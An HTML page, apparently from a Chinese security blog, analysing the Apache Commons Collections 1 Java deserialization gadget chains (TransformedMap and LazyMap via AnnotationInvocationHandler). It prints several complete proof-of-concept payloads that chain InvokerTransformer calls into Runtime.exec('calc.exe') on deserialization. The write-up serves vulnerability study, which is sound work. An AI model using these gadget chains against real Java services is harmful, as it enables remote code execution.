@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Apache-Commons-Collections 1 - ConsT27's Blog</title>
+    <link href="../../../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Apache-Commons-Collections 1", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_1" },
+              {title: "\u7248\u672c", url: "#_2" },
+              {title: "\u73af\u5883", url: "#_3" },
+              {title: "Transformer Map \u94fe", url: "#transformer-map" },
+              {title: "LazyMap\u94fe", url: "#lazymap" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../Apache-Commons-Collections%202/Apache-Commons-Collections%202/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../Apache-Commons-Collections%202/Apache-Commons-Collections%202/" class="btn btn-xs btn-link">
+        Apache-Commons-Collections 2
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../CC%E9%93%BE%E5%88%86%E6%9E%90/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../CC%E9%93%BE%E5%88%86%E6%9E%90/" class="btn btn-xs btn-link">
+        CC链分析
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="apache-commons-collections-1">Apache-Commons-Collections 1</h1>
+<h2 id="_1">目录</h2>
+<ul>
+<li><a href="#版本">版本</a></li>
+<li><a href="#环境">环境</a></li>
+<li><a href="#Transformer-Map-链">Transformer Map 链</a><ul>
+<li><a href="#RCE原理">RCE原理</a><ul>
+<li><a href="#TransformerMap类">TransformerMap类</a></li>
+<li><a href="#Transformer类">Transformer类</a></li>
+<li><a href="#ConstantTransformer">ConstantTransformer</a></li>
+<li><a href="#InvokerTransformer">InvokerTransformer</a></li>
+<li><a href="#ChainedTransformer">ChainedTransformer</a></li>
+</ul>
+</li>
+<li><a href="#触发">触发</a></li>
+<li><a href="#总结">总结</a></li>
+</ul>
+</li>
+<li><a href="#LazyMap链">LazyMap链</a><ul>
+<li><a href="#RCE原理">RCE原理</a></li>
+<li><a href="#触发">触发</a></li>
+<li><a href="#总结">总结</a></li>
+</ul>
+</li>
+</ul>
+<hr />
+<p>title: Apache-Commons-Collections1 反序列化分析
+date:
+tags: java开发与安全</p>
+<h2 id="_2">版本</h2>
+<p>CommonsCollections 3.1 - 3.2.1</p>
+<p>JDK版本：1.7（8u71之后已修复不可利用）</p>
+<h2 id="_3">环境</h2>
+<pre><code class="language-java">&lt;dependency&gt;
+&lt;groupId&gt;commons-collections&lt;/groupId&gt;
+&lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
+&lt;version&gt;3.2&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<h2 id="transformer-map">Transformer Map 链</h2>
+<h3 id="rce">RCE原理</h3>
+<p>我在网上找到了一则利用代码，虽然这个利用代码很粗浅，并没有CC链1的触发过程，但是对于这条链的原理还是可见一斑的。</p>
+<pre><code class="language-纯文本">import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+import java.util.HashMap;
+import java.util.Map;
+public class test {
+    public static void main(String[] args) throws Exception {
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.getRuntime()),
+                new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class},
+                        new Object[]
+                                {&quot;calc.exe&quot;}),
+        };
+        Transformer transformerChain = new
+                ChainedTransformer(transformers);
+        Map innerMap = new HashMap();
+        Map outerMap = TransformedMap.decorate(innerMap, null,
+                transformerChain);
+        outerMap.put(&quot;test&quot;, &quot;xxxx&quot;);
+    }
+}
+</code></pre>
+<h4 id="transformermap">TransformerMap类</h4>
+<p>TransformerMap类是造成这个漏洞的原因之一</p>
+<p>TransformerMap是apacheCommonsCollections里提供的一个数据类型。它可以修饰一个Map类型的对象。当修饰过的Map添加新元素时，它会调用在decorate里声明好的Trasnformer类的transform方法并传入新添的键名或值名。</p>
+<pre><code class="language-纯文本">Map DecoratedMap = TransformedMap.decorate（Map,keyTransformer,valueTransformer）
+</code></pre>
+<p>keyTransformer和valueTransformer分别指向不同的Transformer类。</p>
+<h4 id="transformer">Transformer类</h4>
+<p>我们看一下Transformer类</p>
+<p><img alt="QQ截图20210217150055" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217150055.png" title="QQ截图20210217150055" /></p>
+<p>可以发现它只是一个借口，他的方法需要其他子类实现。
+当TransformerMap在新添元素时就会调用decorate里设定好的Transformer类的transform方法。
+它的接口实现类有以下几个。</p>
+<h4 id="constanttransformer">ConstantTransformer</h4>
+<p>这个类主要的两个方法就是这俩了。</p>
+<pre><code class="language-java">public ConstantTransformer(Object constantToReturn) {
+        this.iConstant = constantToReturn;
+    }
+
+    public Object transform(Object input) {
+        return this.iConstant;
+    }
+</code></pre>
+<p>没什么好说的，就是把传入的对象原原本本返回。</p>
+<h4 id="invokertransformer">InvokerTransformer</h4>
+<p>也是两个重要方法</p>
+<pre><code class="language-java">public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
+        this.iMethodName = methodName;
+        this.iParamTypes = paramTypes;
+        this.iArgs = args;
+    }
+
+    public Object transform(Object input) {
+        if (input == null) {
+            return null;
+        } else {
+            try {
+                Class cls = input.getClass();
+                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
+                return method.invoke(input, this.iArgs);
+            } catch (NoSuchMethodException var5) {
+                throw new FunctorException(&quot;InvokerTransformer: The method '&quot; + this.iMethodName + &quot;' on '&quot; + input.getClass() + &quot;' does not exist&quot;);
+            } catch (IllegalAccessException var6) {
+                throw new FunctorException(&quot;InvokerTransformer: The method '&quot; + this.iMethodName + &quot;' on '&quot; + input.getClass() + &quot;' cannot be accessed&quot;);
+            } catch (InvocationTargetException var7) {
+                throw new FunctorException(&quot;InvokerTransformer: The method '&quot; + this.iMethodName + &quot;' on '&quot; + input.getClass() + &quot;' threw an exception&quot;, var7);
+            }
+        }
+    }
+</code></pre>
+<p>就是传入方法名，参数类型和参数，然后通过反射来执行这个方法</p>
+<h4 id="chainedtransformer">ChainedTransformer</h4>
+<p>也是两个重要方法</p>
+<pre><code class="language-纯文本">   public ChainedTransformer(Transformer[] transformers) {
+        this.iTransformers = transformers;
+    }
+
+    public Object transform(Object object) {
+        for(int i = 0; i &lt; this.iTransformers.length; ++i) {
+            object = this.iTransformers[i].transform(object);
+        }
+
+        return object;
+    }
+</code></pre>
+<p>就是把传入的多个Transfomer类的transformer方法依次执行，每个transformer方法执行后返回的对象会被当做下一次执行的时候传入的参数。</p>
+<p>通过以上信息，我们就可以清晰的看懂上面的payload了。
+先通过ConstantTransformer获得 Runtime类，再通过InvokerTransformer执行exec方法，然后通过ChainedTransformer将两个类串起来，让InvokerTransformer以ConstantTrasformer返回的Runtime类为参数执行exec方法，达到RCE的目的。</p>
+<h3 id="_4">触发</h3>
+<p>触发，我们选择的地方是sun.reflect.annotation.AnnotationInvocationHandler的readObject方法（注意8u71以下才能有触发点，之后的版本已被修复）</p>
+<p><img alt="QQ截图20210217150130" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217150130.png" title="QQ截图20210217150130" /></p>
+<p>触发点代码。
+我们可以发现，它对传入的map的每一个value执行了setValue。</p>
+<p><img alt="" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217150142.png" /></p>
+<p>可以很明显的发现会对值进行transform方法。也就是相当于触发了一次Map.put()。接下来，就是payload构造时间了。</p>
+<p>但是 AnnotationInvocationHandler 是内部类无法直接实例化，但它的父类InvocationHandler可以，我们可以通过反射得到 AnnotationInvocationHandler 构造方法，然后对其使用newInstance再向上转型为父类 InvocationHandler 。既然要获得对象，我们就应该关注一下它的构造方法。</p>
+<pre><code class="language-java">    AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) {
+        Class[] var3 = var1.getInterfaces();
+        if (var1.isAnnotation() &amp;&amp; var3.length == 1 &amp;&amp; var3[0] == Annotation.class) {
+            this.type = var1;
+            this.memberValues = var2;
+        } else {
+            throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;);
+        }
+    }
+</code></pre>
+<p>要传入两个参数，var2不用说了就是我们传入的Map，var1呢？是Annotation类，即所有注释类的接口。我们必须在此处传入一个注释类才能使if判断为真，才能把我们的参数中的Map传入。
+但是并不是所有注释类传进去都有效，注释类（实际上就是接口）必须有定义的方法才能正常触发反序列化。关于此点我们后面再详细谈谈。</p>
+<p>因为再readObject方法里我们会执行<strong>Map var3 = var2.memberTypes()</strong>，我们看看memberTypes源码。</p>
+<p><img alt="image-20211027185805731" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211027185805731.png" title="image-20211027185805731" /></p>
+<p>发现是返回构造方法中定义好的memberTypes属性。而这个memberTypes属性又和上一行的var2属性有关，var2属性又与getDecalredMethods有关…因此我才猜测 “注释类必须有定义的方法才能正常触发反序列化 “,实际结果确实如此。
+目前找到的能够正常触发漏洞的注释类有 Target Retention SuppressWarnings .无一例外他们作为接口都定义了方法。而且在我翻阅一些参考文档后，发现确实是这样</p>
+<p>另外一点需要注明的是，Runtime类没有继承Serialize接口，也就是说它不能被直接序列化。
+也就是说如果我们在transformer链里想直接通过有<strong>new ConstantTransformer(Runtime.<em>getRuntime</em>())</strong> 来获取Runtime对象时，会反序列化失败。
+但是Class类是有继承Serialize接口的，我们可以通过transformer链和反射来在反序列化阶段逐步创建Runtime类，继而解决这个问题</p>
+<p>总结一下几个坑点：
+1.Runtime类不能被序列化
+\2. AnnotationInvocationHandler 无法直接实例化，可通过反射获得对象
+3.注意在实例化 AnnotationInvocationHandler 时要传入定义好方法的注释类
+OK，以上知道了后就能试着写一下payload了（这个payload依旧不能正常执行，错误出处间代码注释，具体原因看下文）。</p>
+<pre><code class="language-纯文本">import java.io.*;
+import java.lang.annotation.*;
+import java.lang.reflect.*;
+import java.util.*;
+import org.apache.commons.collections.*;
+import org.apache.commons.collections.functors.*;
+import org.apache.commons.collections.map.TransformedMap;
+
+public class test2 {
+    public static void main(String[] args){
+        try {
+            Transformer[] transformers = new Transformer[]{
+                    new ConstantTransformer(Runtime.class),
+                    new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class},new Object[]{new String(&quot;getRuntime&quot;),new Class[0]}),
+                    new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
+                    new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{new String(&quot;calc.exe&quot;)}),
+            };
+            ChainedTransformer chain = new ChainedTransformer(transformers);
+            Map innermap = new HashMap();
+            innermap.put(&quot;sc&quot;,&quot;b&quot;);  //不能执行的原因在这里，如果是put(&quot;value&quot;,&quot;a&quot;)就可以正常执行
+            Map outmap = TransformedMap.decorate(innermap,null,chain);
+
+            Class Annotation = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+            Constructor AnnotationCons = Annotation.getDeclaredConstructor(Class.class,Map.class);
+            AnnotationCons.setAccessible(true);
+            InvocationHandler InvocationHandler = (InvocationHandler) AnnotationCons.newInstance(Target.class,outmap);
+
+            ObjectOutputStream a = new ObjectOutputStream(new FileOutputStream(new File(&quot;a.bin&quot;)));
+            a.writeObject(InvocationHandler);
+            a.close();
+            ObjectInputStream b = new ObjectInputStream(new FileInputStream(&quot;a.bin&quot;));
+            b.readObject();
+            b.close();
+        }
+        catch (Exception e){e.printStackTrace();}
+    }
+
+}
+</code></pre>
+<p>为什么不能执行，这原因与上面提到的“ 注意在实例化 AnnotationInvocationHandler 时要传入定义好方法的注释类 ”很有关联。
+因为涉及JVM的一些东西，我们不会怎么去深究，就是浅浅的看一下，做出一些推测。</p>
+<p>首先我们关注到 AnnotationInvocationHandler 的readObject。</p>
+<p><img alt="QQ截图20210217150215" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217150215.png" title="QQ截图20210217150215" /></p>
+<p>接下来就是复杂的推理了，建议先把各方法的意义弄明白
+发现必须要var7！=null才能正常触发反序列化漏洞，那么var7的来源是从(Map)var3中获得以(String)var6为键名的值。var6是var3中一项的键名。而var3的来源是(Annotation)var2的menberTypes,我们跟进这个方法。</p>
+<p><img alt="QQ截图20210217150244" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217150244.png" title="QQ截图20210217150244" /></p>
+<p>那么var1就是AnnotationInvocationHandler的type属性了，而这个type属性在其构造方法中就定义好了，是传入的注释类。
+也就是说var1就是我们在实例 AnnotationInvocationHandler 时传入的注释类。
+结合以上流程，我们就可以知道这个过程是:
+从 实例 AnnotationInvocationHandler 时传入的注释类 中获取最后一个方法，然后把它编入为一个HashMap(以下称为注释方法Map)的一个键名并给予值。在readObject时会遍历传入的Map，如果在传入的Map中找到了一项的键名在注释方法Map中存在（即 在传入的Map中找到了一项的键名与实例化时传入的注释类的最后一个方法同名），则if条件为真，攻击成功。
+所以上面为什么put(“value”,任意)才能达成攻击的原因是， Target Retention SuppressWarnings 这三个注释类都有且只有一个方法名为value的方法。</p>
+<p><img alt="QQ截图20210217150343" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217150343.png" title="QQ截图20210217150343" /></p>
+<p>分析完了。这个洞利用版本只能在8u71以前，比较古老无用。</p>
+<h3 id="_5">总结</h3>
+<p>AnnotationInvocationHandler.readObject 会调用传入的map中每一个value的transformer方法，我们可以通过ConstantTrasformer和InvokerTransformer组合为一个ChainedTransformer来逐步还原Runtime类并调用其exec方法实现命令执行。</p>
+<p>ConstantTransformer.transformer是返回传入的类，InvokerTransformer.transformer是通过反射对传入的方法名参数名等进行调用，ChainedTransformer.transformer是将传入的transformer方法按顺序执行，并将上一个方法执行结果做参数传递给下一个方法。</p>
+<p>在cc4.0中可以发现TransformedMap的decorate方法被删除了，导致该链不能顺畅运行。
+jdk8u71 中的AnnotationInvocationHandler#readObject方法中没有memberValue.entrySet，导致链不能顺畅运行。</p>
+<h2 id="lazymap">LazyMap链</h2>
+<pre><code class="language-java">ObjectInputStream.readObject()
+            AnnotationInvocationHandler.readObject()
+                Map(Proxy).entrySet()
+                    AnnotationInvocationHandler.invoke()
+                        LazyMap.get()
+                            ChainedTransformer.transform()
+                                ConstantTransformer.transform()
+                                InvokerTransformer.transform()
+                                    Method.invoke()
+                                        Class.getMethod()
+                                InvokerTransformer.transform()
+                                    Method.invoke()
+                                        Runtime.getRuntime()
+                                InvokerTransformer.transform()
+                                    Method.invoke()
+                                        Runtime.exec()
+</code></pre>
+<h3 id="rce_1">RCE原理</h3>
+<p>LazyMap的获得方法和TransfromerMap差不多。</p>
+<pre><code class="language-纯文本">        Map innerMap = new HashMap();
+        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
+    public Object get(Object key) {
+        if (!super.map.containsKey(key)) {
+            Object value = this.factory.transform(key);
+            super.map.put(key, value);
+            return value;
+        } else {
+            return super.map.get(key);
+        }
+</code></pre>
+<p>在对LazyMap使用get方法时，它会执行this.factory.transform(key),而this.factory.transform如果去跟进分析的话，实质上就是调用我们在decorate传进去的Transformer类。</p>
+<p><img alt="" src="../image/image_pM1-gsywEW.png" /></p>
+<h3 id="_6">触发</h3>
+<p>LazyMap的触发点也在 AnnotationInvocationHandler 中，但不是在readObject方法，而是在invoke方法。invoke方法中有一行</p>
+<pre><code class="language-纯文本">Object var6 = this.memberValues.get(var4);
+</code></pre>
+<p>其中this.memberVales是在构造方法中定义为传入的Map。</p>
+<p>那么invoke方法要怎么才能触发呢？答案是动态代理。
+熟悉动态代理的朋友肯定直到，invoke方法是动态代理中的一个特殊的方法，在代理类中无论执行什么方法，实质上都是在执行invoke方法。</p>
+<p>那么接下来就是骚思路了：
+我们通过反射和向上转型得到一个 <strong>AnnotationInvocationHandler(Class var1, Map var2)</strong> 对象。
+构建一个Map的代理类，其第三个参数是刚刚得到的 <strong>AnnotationInvocationHandler</strong> 对象，再故技重施将其通过向上转型得到一个 <strong>AnnotationInvocationHandler</strong> 对象。当该对象反序列化执行readObjct方法时，会执行以下entryset方法</p>
+<p><img alt="QQ截图20210217150359" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217150359.png" title="QQ截图20210217150359" /></p>
+<p>本质上来说，是对一个代理类执行了一下entrySet方法，即执行了代理类的invoke方法，又因为代理类的第三个参数填入的是 <strong>AnnotationInvocationHandler</strong> 对象，其内部已经写好了invoke方法，所以此处执行的代理类的invoke方法即 <strong>AnnotationInvocationHandler</strong> 对象的invoke方法，继而触发了get方法，继而触发了漏洞。这是一个很妙的地方</p>
+<p>多说无益，整paylaod吧</p>
+<pre><code class="language-纯文本">import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.io.*;
+import java.lang.annotation.Retention;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Method;
+import java.lang.reflect.Proxy;
+import java.util.HashMap;
+import java.util.Map;
+public class test2 {
+    public static void main(String[] args) throws Exception {
+        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[] {
+                        String.class, Class[].class }, new Object[] {
+                        &quot;getRuntime&quot;, new Class[0] }),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[] {
+                        Object.class, Object[].class }, new Object[] {
+                        null, new Object[0] }),
+                new InvokerTransformer(&quot;exec&quot;,
+                        new Class[] { String.class }, new Object[]{&quot;calc.exe&quot;})});
+
+            Map innermap = new HashMap();
+            Map outermap = LazyMap.decorate(innermap, chainedTransformer);
+
+            Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+            Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class);
+            cons.setAccessible(true);
+//妙处
+            InvocationHandler handler = (InvocationHandler) cons.newInstance(Override.class,outermap);//获得一个AnnotationInvocationHandler对象
+            Map Prox = (Map) Proxy.newProxyInstance(outermap.getClass().getClassLoader(), outermap.getClass().getInterfaces(),handler);//创建一个Map的代理类，其代理方法为AnnotationInvocationHandler对象里的invoke方法
+            InvocationHandler handler1 = (InvocationHandler) cons.newInstance(Override.class,Prox);  //将代理Map传入，当代理Map被执行任一方法时，执行invoke方法
+//
+            ObjectOutputStream a = new ObjectOutputStream(new FileOutputStream(&quot;a.bin&quot;));
+            a.writeObject(handler1);
+            ObjectInputStream b = new ObjectInputStream(new FileInputStream(&quot;a.bin&quot;));
+            b.readObject();
+    }
+}
+</code></pre>
+<h3 id="_7">总结</h3>
+<p>目的就是为了执行AnnotationInvocationHandler 的invoke方法，我们通过实例化一个AnnotationInvocationHandler（A1） 类并在实例化时的参数中加入传入了LazyMap的AnnotationInvocationHandler（AP） 类的动态代理，在A1构造方法中会有一个AP.entryset的代码，从而触发的AP.invoke。</p>
+<p>和TransformMap一样在commons-collections 4 版本中可见，LazyMap的decorate方法被删除，导致这个链不能正常执行。</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../Apache-Commons-Collections%202/Apache-Commons-Collections%202/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../Apache-Commons-Collections%202/Apache-Commons-Collections%202/" class="btn btn-xs btn-link">
+        Apache-Commons-Collections 2
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../CC%E9%93%BE%E5%88%86%E6%9E%90/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../CC%E9%93%BE%E5%88%86%E6%9E%90/" class="btn btn-xs btn-link">
+        CC链分析
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
